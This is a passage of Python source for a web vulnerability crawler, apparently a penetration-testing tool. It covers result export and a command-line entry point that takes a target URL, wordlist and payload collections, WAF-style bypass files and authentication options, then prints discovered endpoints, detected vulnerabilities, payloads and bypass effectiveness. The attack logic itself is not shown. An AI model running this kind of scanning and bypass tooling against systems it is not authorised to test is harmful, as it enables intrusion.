        self.results['emails'] = list(set(self.results['emails']))
        
        logger.info(f"Crawl complete. Found {len(self.results['endpoints'])} endpoints")
        
        return self.results
    
    def export_results(self, filename='attack_surface.json'):
        """Export results to JSON file in results directory"""
        # Save in results directory
        output_path = os.path.join(self.results_dir, filename)
        with open(output_path, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        logger.info(f"Results exported to {output_path}")
        return output_path


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Smart Vulnerability Crawler with Bypass Integration and Behavioral Analysis')
    parser.add_argument('target', help='Target URL to crawl')
    parser.add_argument('--depth', type=int, default=3, help='Maximum crawl depth (default: 3)')
    parser.add_argument('--max-pages', type=int, default=1000, help='Maximum pages to crawl (default: 1000)')
    parser.add_argument('--output', default='attack_surface.json', help='Output JSON file')
    parser.add_argument('--wordlist-base', required=True,
                        help='Base path for wordlists (REQUIRED). Example: /usr/share/wordlists or ~/wordlists')
    parser.add_argument('--discovery-limit', type=int, default=1000, help='Max paths to test')
    parser.add_argument('--skip-discovery', action='store_true', help='Skip wordlist discovery')
    parser.add_argument('--bypass-file', help='JSON file with bypasses')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--debug', action='store_true',
                        help='Enable debug mode: logs all I/O data, headers, and data flows to debug_*.json')

    # Authentication options
    auth_group = parser.add_argument_group('authentication')
    auth_group.add_argument('--auth-type', choices=['basic', 'bearer', 'cookie', 'form', 'custom_header'],
                           help='Authentication type')
    auth_group.add_argument('--auth-username', help='Username for authentication')
    auth_group.add_argument('--auth-password', help='Password for authentication')
    auth_group.add_argument('--auth-token', help='Bearer token')
    auth_group.add_argument('--auth-login-url', help='Login URL for form auth')
    auth_group.add_argument('--auth-cookies', help='Cookies in format: name1=value1;name2=value2')
    auth_group.add_argument('--auth-headers', help='Headers in format: Header1:Value1;Header2:Value2')
    auth_group.add_argument('--auth-config', help='JSON file with auth configuration')
    
    args = parser.parse_args()

    # ========== VALIDATE WORDLIST-BASE (REQUIRED) ==========
    wordlist_base = os.path.expanduser(args.wordlist_base)  # Expand ~ if used
    if not os.path.isdir(wordlist_base):
        print(f"\n  ✗ ERROR: Wordlist base path does not exist: {wordlist_base}")
        print(f"    Please specify a valid path with --wordlist-base")
        print(f"    Example: --wordlist-base /usr/share/wordlists")
        print(f"             --wordlist-base ~/SecLists")
        sys.exit(1)

    # Check for expected subdirectories
    expected_dirs = ['SecLists', 'PayloadsAllTheThings', 'fuzzdb']
    found_dirs = [d for d in expected_dirs if os.path.isdir(os.path.join(wordlist_base, d))]

    if not found_dirs:
        print(f"\n  ⚠ WARNING: No standard wordlist directories found in {wordlist_base}")
        print(f"    Expected one of: {', '.join(expected_dirs)}")
        print(f"    Detection capabilities may be limited.")
        print(f"    Consider installing SecLists: git clone https://github.com/danielmiessler/SecLists.git")
    else:
        print(f"\n  ✓ Wordlist base: {wordlist_base}")
        print(f"    Found: {', '.join(found_dirs)}")

    # Build auth configuration
    # Priority: command line args > JSON file > defaults
    auth_config = None

    # First: load from JSON file if specified
    if args.auth_config:
        try:
            with open(args.auth_config, 'r') as f:
                auth_config = json.load(f)
            print(f"  ✓ Loaded auth config from {args.auth_config}")
        except Exception as e:
            print(f"  ✗ Error loading auth config: {e}")
            sys.exit(1)

    # Second: merge/override with command line options
    if args.auth_type or args.auth_username or args.auth_token or args.auth_cookies:
        if auth_config is None:
            auth_config = {}

        # Command line args take precedence over JSON file
        if args.auth_type:
            auth_config['type'] = args.auth_type
        if args.auth_username:
            auth_config['username'] = args.auth_username
        if args.auth_password:
            auth_config['password'] = args.auth_password
        if args.auth_token:
            auth_config['token'] = args.auth_token
        if args.auth_login_url:
            auth_config['login_url'] = args.auth_login_url
        if args.auth_cookies:
            cookies = {}
            for cookie in args.auth_cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.split('=', 1)
                    cookies[name.strip()] = value.strip()
            auth_config['cookies'] = cookies
        if args.auth_headers:
            headers = {}
            for header in args.auth_headers.split(';'):
                if ':' in header:
                    name, value = header.split(':', 1)
                    headers[name.strip()] = value.strip()
            auth_config['headers'] = headers

    # Validate auth_config has a type
    if auth_config and 'type' not in auth_config:
        print("  ✗ Error: auth config must have a 'type' field")
        print("    Valid types: basic, bearer, cookie, form, custom_header, oauth2")
        sys.exit(1)
    
    # Initialize bypass manager
    bypass_manager = None
    if args.bypass_file:
        bypass_manager = BypassManager(args.bypass_file)
    
    # Create crawler instance with auth and debug mode
    crawler = SmartCrawler(
        args.target,
        max_depth=args.depth,
        max_pages=args.max_pages,
        verbose=args.verbose,
        auth_config=auth_config,
        debug_mode=args.debug
    )
    
    # Set bypass manager
    if bypass_manager:
        crawler.set_bypass_manager(bypass_manager)

    # Set wordlist base path (REQUIRED - already validated above)
    crawler.wordlist_mapper.base_paths = {
        'fuzzdb': f"{wordlist_base}/fuzzdb",
        'payloads': f"{wordlist_base}/PayloadsAllTheThings",
        'seclists': f"{wordlist_base}/SecLists"
    }
    crawler.discovery_mapper.base_paths = {
        'fuzzdb': f"{wordlist_base}/fuzzdb",
        'payloads': f"{wordlist_base}/PayloadsAllTheThings",
        'seclists': f"{wordlist_base}/SecLists"
    }
    
    # Run crawler
    results = crawler.run(discovery_limit=args.discovery_limit, skip_discovery=args.skip_discovery)

    # Export results (returns full path in results directory)
    output_path = crawler.export_results(args.output)
    
    # Print summary
    print("\n" + "="*60)
    print("CRAWL SUMMARY")
    print("="*60)
    print(f"Target: {args.target}")
    print(f"Pages crawled: {len(crawler.visited_urls)}")
    print(f"Endpoints found: {len(results['endpoints'])}")
    print(f"Forms found: {len(results['forms'])}")
    print(f"JavaScript files: {len(results['javascript_files'])}")
    print(f"API endpoints: {len(results['api_endpoints'])}")
    print(f"Interesting files: {len(results['interesting_files'])}")
    
    # Behavioral analysis summary
    if results['behavioral_analysis_results']:
        print(f"\n🧪 BEHAVIORAL ANALYSIS: {len(results['behavioral_analysis_results'])} parameters analyzed")
        
        # Count detected behaviors
        behaviors_detected = defaultdict(int)
        for analysis in results['behavioral_analysis_results']:
            for context, result in analysis['results'].items():
                if result.get('detected'):
                    behaviors_detected[context] += 1
        
        if behaviors_detected:
            print("  Behaviors detected:")
            for behavior, count in behaviors_detected.items():
                print(f"    - {behavior}: {count} parameters")
    
    # Vulnerability test results
    if results['vulnerability_test_results']:
        print(f"\n🚨 VULNERABILITIES DETECTED: {len(results['vulnerability_test_results'])}")
        
        # Group by vulnerability type
        vuln_by_type = defaultdict(list)
        for result in results['vulnerability_test_results']:
            vuln_by_type[result['vulnerability_type']].append(result)
        
        for vuln_type, vuln_results in vuln_by_type.items():
            print(f"\n{vuln_type.upper()} ({len(vuln_results)} found):")
            for result in vuln_results[:3]:  # Show first 3 of each type
                bypass_info = f" (via {result['bypass_used']})" if result['bypass_used'] else ""
                print(f"  📍 {result['endpoint']} → {result['parameter']}{bypass_info}")
                print(f"     Payload: {result['payload'][:50]}{'...' if len(result['payload']) > 50 else ''}")
    
    # Technology summary
    print("\nDETECTED TECHNOLOGIES:")
    for key, value in results['technologies'].items():
        if value and key not in ['headers', 'cookies', 'javascript_libs', 'infrastructure', 'stack']:
            print(f"  {key.capitalize()}: {value}")
    if results['technologies'].get('javascript_libs'):
        print(f"  JS Libraries: {', '.join(results['technologies']['javascript_libs'])}")
    
    # Infrastructure from bypass file
    if results['technologies'].get('stack'):
        print("\nINFRASTRUCTURE STACK (from bypass file):")
        stack = results['technologies']['stack']
        for component, value in stack.items():
            if value:
                print(f"  {component.capitalize()}: {value}")
    
    # Bypass usage summary
    if bypass_manager and bypass_manager.validated_bypasses:
        print(f"\nBYPASSES USED:")
        for bypass in bypass_manager.validated_bypasses:
            print(f"  ✅ {bypass['type']}: {bypass['description']}")
        
        # Count bypass usage in vulnerability results
        bypass_usage = defaultdict(int)
        for result in results['vulnerability_test_results']:
            if result['bypass_used']:
                bypass_usage[result['bypass_used']] += 1
        
        if bypass_usage:
            print(f"\nBYPASS EFFECTIVENESS:")
            for bypass_type, count in bypass_usage.items():
                print(f"  🔧 {bypass_type}: {count} successful tests")
    
    # Top priority endpoints
    print("\nTOP PRIORITY ENDPOINTS:")
    for endpoint in results['endpoints'][:5]:
        print(f"  [{endpoint['priority']}] {endpoint['method']} {endpoint['url']}")
        for param in endpoint.get('parameters', [])[:2]:
            if param.get('predicted_vulns'):
                vulns = ', '.join([v['type'] for v in param['predicted_vulns']])
                print(f"    └─ {param['name']}: {vulns}")
    
    # Save debug log if debug mode was enabled
    if args.debug and crawler.debug_logger:
        debug_file = crawler.debug_logger.save()
        if debug_file:
            print(f"\n🐛 DEBUG LOG saved to: {debug_file}")
            print("   Contains: all HTTP I/O, headers, auth events, data flows")
            print("   Attach this file when reporting bugs")

    print("\n" + "="*60)
    print(f"📂 All results saved to: {crawler.results_dir}")
    print(f"   - {output_path}")
    print(f"   - {crawler.vuln_logger.vuln_file}")
    if args.debug and crawler.debug_logger:
        print(f"   - {crawler.debug_logger.output_file}")
    print("="*60)


if __name__ == "__main__":
    main()